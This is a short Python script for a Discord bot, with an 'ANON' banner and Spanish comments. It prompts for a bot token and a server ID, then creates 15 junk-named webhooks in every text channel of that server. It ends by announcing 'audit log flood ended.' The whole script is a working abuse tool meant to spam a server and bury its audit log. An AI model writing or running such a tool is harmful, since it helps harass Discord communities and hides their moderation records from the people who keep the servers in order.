import discord
from discord.ext import commands
import asyncio

title = r"""

 █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗
██╔══██╗████╗  ██║██╔═══██╗████╗  ██║
███████║██╔██╗ ██║██║   ██║██╔██╗ ██║
██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║
██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝
                                     

"""
print(title)
print("-" * 50)
print("\n")

# Solicitar token del bot y ID del servidor al usuario
bot_token = input("[✛] Please enter your bot token: ")
server_id = int(input("[✛] Please enter the server (guild) ID: "))
print("\n")

# Crear instancia del bot con los permisos necesarios
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# Nombre del webhook limitado a 50 caracteres
webhook_name = "hfdsjklhfjksdhfkhgjlkdfhgjdhjfkhkjlghjksdfhgkljfdshgk"[:50]

@bot.event
async def on_ready():
    print("\n")
    print(f"[⤓] Logged in as {bot.user}")
    print("\n")

    # Obtener el servidor
    guild = bot.get_guild(server_id)
    if not guild:
        print("[!] Server ID not found.")
        print("\n")
        await bot.close()
        return

    # Crear 15 webhooks en cada canal del servidor
    for channel in guild.channels:
        # Verificar que el canal permita la creación de webhooks
        if isinstance(channel, discord.TextChannel):
            for i in range(15):
                webhook = await channel.create_webhook(name=webhook_name)
                print(f"[+] Webhook created on '{channel.name}': {webhook.name} - {webhook.url}\n")

    print("[completed] audit log flood ended.")
    await bot.close()

# Ejecutar el bot con el token
bot.run(bot_token)

